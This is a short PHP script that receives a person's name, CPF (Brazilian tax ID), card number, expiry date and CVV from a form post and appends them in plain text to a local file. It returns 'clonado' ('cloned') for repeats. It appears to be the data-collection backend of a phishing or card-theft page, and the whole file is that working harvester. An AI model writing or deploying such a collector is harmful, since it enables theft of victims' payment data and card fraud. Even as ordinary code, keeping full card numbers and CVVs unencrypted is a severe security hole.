<?php
$dataFile = 'dados.txt';

$nome = isset($_POST['nome']) ? trim($_POST['nome']) : '';
$cpf = isset($_POST['cpf']) ? trim($_POST['cpf']) : '';
$numero_cartao = isset($_POST['numero_cartao']) ? trim($_POST['numero_cartao']) : '';
$validade = isset($_POST['validade']) ? trim($_POST['validade']) : '';
$cvv = isset($_POST['cvv']) ? trim($_POST['cvv']) : '';

$entry = $nome . '|' . $cpf . '|' . $numero_cartao . '|' . $validade . '|' . $cvv;

$entries = [];
if (file_exists($dataFile)) {
    $contents = file_get_contents($dataFile);
    $entries = array_filter(explode("\n", $contents));
}

if (in_array($entry, $entries)) {
    $response = array("status" => "clonado");
} else {
    file_put_contents($dataFile, $entry . "\n", FILE_APPEND);
    $response = array("status" => "ok");
}

header('Content-Type: application/json');
echo json_encode($response);
?>
